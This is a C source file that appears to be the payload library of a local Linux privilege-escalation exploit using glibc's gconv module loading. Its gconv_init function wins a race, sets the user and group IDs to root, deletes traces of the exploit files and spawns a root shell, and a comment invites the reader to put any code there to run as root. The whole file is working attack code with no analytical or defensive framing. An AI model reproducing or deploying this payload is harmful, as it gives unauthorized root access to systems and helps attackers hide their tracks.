#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/file.h>
#include <unistd.h>

void payload() {
  // replace with code you want to run as root
  system("/bin/sh");
}

void gconv() {}

void gconv_init() {
  printf("[*] Won Race\n");
  int lfd = open("/tmp/privlock", O_RDWR);
  // lock file for our use only
  // seems to be able to trigger multiple times
  if (0 != flock(lfd, LOCK_EX | LOCK_NB)) {
    goto exit;
  }
  setuid(0);
  setgid(0);
  setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin:/bin/:", 1);
  system("rm -rf GCONV_PATH=.");
  system("rm -rf privesc");
  payload();
  system("rm /tmp/privlock");

exit:
  exit(EXIT_SUCCESS);
}
